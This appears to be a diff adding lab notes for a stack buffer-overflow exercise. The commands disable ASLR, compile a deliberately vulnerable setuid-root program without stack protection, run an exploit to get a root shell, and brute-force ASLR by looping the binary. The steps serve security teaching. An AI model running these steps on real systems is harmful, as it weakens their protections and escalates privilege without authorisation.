@@ -1,0 +1,24 @@
+sudo sysctl -w kernel.randomize_va_space=0
+
+gcc -z execstack -o call_shellcode call_shellcode.c
+
+sudo su
+
+gcc -o stack -z execstack -fno-stack-protector stack.c
+
+chmod 4755 stack
+
+exit
+
+gcc -o exploit exploit.c
+
+./exploit
+./stack
+
+id
+
+exit
+
+sudo sysctl -w kernel.randomize_va_space=2
+
+sh -c "while [ 1 ]; do ./stack; done;"
